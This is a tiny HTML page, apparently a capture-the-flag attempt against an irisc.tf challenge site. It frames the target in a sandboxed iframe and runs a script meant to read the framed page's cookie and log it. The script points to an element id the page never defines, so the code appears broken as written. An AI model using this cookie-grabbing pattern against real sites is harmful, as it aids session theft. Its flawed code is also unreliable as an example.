<!DOCTYPE html>
<html>
<body>
<h1>Hello World</h1>
<p>index.html</p>
<iframe src="https://lamenote-web.chal.irisc.tf/home" width=200 height=200 sandbox="allow-forms allow-same-origin">
<script>
  var cookie = document.getElementById("iframeId").contentDocument.cookie;
  console.log(cookie);
</script>
</body>
</html>
